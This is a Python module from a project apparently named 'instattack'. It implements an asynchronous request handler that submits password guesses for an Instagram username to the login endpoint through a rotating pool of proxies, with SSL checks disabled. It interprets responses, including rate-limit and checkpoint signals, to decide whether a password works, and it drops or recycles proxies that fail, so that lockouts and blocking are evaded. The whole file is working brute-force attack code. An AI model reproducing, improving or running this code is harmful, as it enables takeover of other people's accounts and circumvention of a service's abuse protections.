import aiohttp
import asyncio

from instattack import settings
from instattack.exceptions import (
    ClientResponseError, HttpRequestError, InvalidResponseJson,
    InstagramResultError, ClientTooManyRequests, find_request_error,
    HTTP_REQUEST_ERRORS, HttpFileDescriptorError)

from .models import InstagramResult
from .utils import get_token


class ProxyErrorHandlerMixin(object):

    async def handle_proxy_error(self, e, proxy, scheduler):
        """
        [1] Fatal Error:
        ---------------
        If `remove_invalid_proxy` is set to True and this error occurs,
        the proxy will be removed from the database.
        If `remove_invalid_proxy` is False, the proxy will just be noted
        with the error and the proxy will not be put back in the pool.

        Since we will not delete directly from this method (we need config)
        we will just note the error.

        [2] Inconclusive Error:
        ----------------------
        Proxy will not be noted with the error and the proxy will be put
        back in pool.

        [3] Semi-Fatal Error:
        --------------------
        Regardless of the value of `remove_invalid_proxy`, the  proxy
        will be noted with the error and the proxy will be removed from
        the pool.

        [4] General Error:
        -----------------
        Proxy will be noted with error but put back in the pool.

        TODO
        ----
        Only remove proxy if the error has occured a certain number of times, we
        should allow proxies to occasionally throw a single error.
        """
        log = self.create_logger('login_request')

        # Allow Manual Treatments
        await proxy.handle_error(e)

        if e.__treatment__ == 'fatal':
            if self.remove_proxy_on_error:
                await log.error(e, extra={'other': 'Removing Proxy', 'proxy': proxy})
                await scheduler.spawn(proxy.delete())
            else:
                await scheduler.spawn(proxy.save())

        elif e.__treatment__ in ('semifatal', 'error'):
            if e.__treatment__ == 'error':
                await self.proxy_handler.pool.put(proxy)

            await scheduler.spawn(proxy.save())

        elif e.__treatment__ == 'inconclusive':
            # Do not need to save...
            await self.proxy_handler.pool.put(proxy)


class RequestHandler(ProxyErrorHandlerMixin):

    def __init__(self, config, proxy_handler):

        self.config = config
        self.proxy_handler = proxy_handler

        self._headers = None
        self._cookies = None
        self._token = None

        self.remove_proxy_on_error = config['proxies']['pool']['remove_proxy_on_error']

    @property
    def _connector(self):
        return aiohttp.TCPConnector(
            ssl=False,
            force_close=True,
            limit=self.config['login']['connection']['limit'],
            limit_per_host=self.config['login']['connection']['limit_per_host'],
            enable_cleanup_closed=True,
        )

    @property
    def _timeout(self):
        return aiohttp.ClientTimeout(
            total=self.config['login']['connection']['timeout']
        )

    def _login_data(self, password):
        return {
            settings.INSTAGRAM_USERNAME_FIELD: self.user.username,
            settings.INSTAGRAM_PASSWORD_FIELD: password
        }

    @property
    def headers(self):
        return self._headers

    @property
    def token(self):
        return self._token

    async def cookies(self):
        if not self._cookies:
            # TODO: Set timeout to the token timeout.
            sess = aiohttp.ClientSession(connector=self._connector)
            self._token, self._cookies = await get_token(sess)

            if not self._token:
                raise RuntimeError('Could not find token.')

            self._headers = settings.HEADERS(self._token)
            await sess.close()

        return self._cookies

    async def parse_response_result(self, response, result, password, proxy):
        """
        Raises an exception if the result that was in the response is either
        non-conclusive or has an error in it.

        If the result does not have an error and is non conslusive, than we
        can assume that the proxy was most likely good.
        """
        result = InstagramResult.from_dict(result, proxy=proxy, password=password)
        if result.has_error:
            raise InstagramResultError(response, result.error_message)
        else:
            if not result.conclusive:
                raise InstagramResultError(response, "Inconslusive result.")
            return result

    async def parse_client_response(self, response, password, proxy):
        """
        Takes the AIOHttp ClientResponse and tries to return a parsed
        InstagramResult object.

        For AIOHttp sessions and client responses, we cannot read the json
        after response.raise_for_status() has been called.

        Since a 400 response will have valid json that can indicate an authentication,
        via a `checkpoint_required` value, we cannot raise_for_status until after
        we try to first get the response json.
        """
        if response.status == 400:
            try:
                json = await response.json()
            except ValueError:
                raise InvalidResponseJson(response)
            else:
                return await self.parse_response_result(response, json, password, proxy)
        else:
            try:
                response.raise_for_status()
            except aiohttp.ClientResponseError as e:
                if response.status == 429:
                    raise ClientTooManyRequests(response)
                else:
                    raise ClientResponseError(response)
            else:
                try:
                    json = await response.json()
                except ValueError:
                    raise InvalidResponseJson(response)
                else:
                    return await self.parse_response_result(response, json, password, proxy)

    async def handle_request_error(self, e, proxy, scheduler):
        """
        Creates exception instances that we have established internally so their
        treatment and handling in regard to proxies and the pool can be determined
        from the error directly.

        If the error is not an instance of HttpError (our internal error), the
        internal version of the error will be determined and this method will
        be called recursively with the created error, that will be an instance
        of HttpError.

        Otherwise, the error will be handled by the handle_proxy_error() method,
        which will eventually be called for all errors unless they are raised
        or suppressed (CancelledError).
        """
        log = self.create_logger('login_request')

        # These Are Our Errors
        if isinstance(e, (HttpRequestError, ClientResponseError)):
            await log.error(e, extra={'proxy': proxy})
            await self.handle_proxy_error(e, proxy, scheduler)
        else:
            if isinstance(e, asyncio.CancelledError):
                pass
            else:
                # Try to associate the error with one that we are familiar with,
                # if we cannot find the appropriate error, than we raise it since
                # we are not aware of this error.
                err = find_request_error(e)
                if not err:
                    raise e

                await log.error(err.original, extra={'proxy': proxy})
                await self.handle_request_error(err, proxy, scheduler)

    async def login_request(self, loop, session, password, proxy, scheduler):
        """
        For a given password, makes a series of concurrent requests, each using
        a different proxy, until a result is found that authenticates or dis-
        authenticates the given password.

        TODO
        ----
        Only remove proxy if the error has occured a certain number of times, we
        should allow proxies to occasionally throw a single error.
        """
        log = self.create_logger('login_request')

        proxy.update_time()

        log.debug('Making Login Request', extra={
            'password': password,
            'proxy': proxy,
        })

        try:
            async with session.post(
                settings.INSTAGRAM_LOGIN_URL,
                headers=self.headers,
                data=self._login_data(password),
                ssl=False,
                proxy=proxy.url  # Only Http Proxies Are Supported by AioHTTP
            ) as response:
                try:
                    result = await self.parse_client_response(response, password, proxy)
                except Exception as e:
                    await log.error(e, extra={'proxy': proxy, 'response': response})
                    await self.handle_proxy_error(e, proxy, scheduler)
                else:
                    if not result:
                        raise RuntimeError("Handling client response should "
                            "not return null proxy.")

                    await proxy.handle_success()
                    await self.proxy_handler.pool.put(proxy)
                    await scheduler.spawn(proxy.save())
                    return result

        except HTTP_REQUEST_ERRORS as e:
            await self.handle_request_error(e, proxy, scheduler)

        except RuntimeError as e:
            """
            RuntimeError: File descriptor 87 is used by transport
            <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>

            All other RuntimeError(s) we want to raise.
            """
            raise e  # Just for now
            if e.errno == 87:
                e = HttpFileDescriptorError(original=e)
                await self.handle_request_error(e, proxy, scheduler)
            else:
                raise e
